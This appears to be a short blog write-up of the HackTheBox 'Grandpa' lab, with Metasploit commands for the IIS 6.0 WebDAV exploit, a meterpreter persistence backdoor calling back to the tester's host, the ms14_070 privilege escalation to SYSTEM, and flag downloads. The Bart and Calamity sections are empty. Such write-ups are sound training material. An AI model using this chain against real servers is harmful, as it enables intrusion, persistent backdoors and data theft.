---
title: "HackTheBox - WriteUp 6"
date: 2019-06-08T10:04:44+08:00
description: "HackTheBox 练手"
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# Grandpa

That really sucks. Even I use VPS in New York which result in ping response always in 20ms, it still failed to get connected from victim.

## MSF way

### Warm up

Nmap Scanned: Port 80 opened. IIS httpd 6.0 with Windows Server 2003.

### Normal User

Run these commands in `msfconsole`:

```bash
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set RHOSTS 10.10.10.14
exploit
```

Then use these commands in meterpreter to stablize it:

```bash
run persistence -X -U -A -L %TEMP% -r 10.10.14.6 -p 4455
getuid
> Permission denied
migrate 2212    # davcdata.exe
getuid
> NT AUTHORITY\NETWORK SERVICE
bg
```

In fact, finally, I migrate to `wmiprvse.exe`. And wait for a long time before privilege escalation.

### Administrator / System

> Due to the fucking network on my VPS, this step took me a lot of time. So you must ensure your network stablity is really well.

```bash
use exploit/windows/local/ms14_070_tcpip_ioctl
set SESSION 1
exploit
bg
sessions -i 1
getuid
> NT AUTHORITY\SYSTEM
download "C:\Documents and settings\harry\desktop\user.txt"
download "C:\Documents and settings\administrator\desktop\root.txt"
```
Privilege Escalated. Finished.

## OSCP way

TBD

# Bart

# Calamity

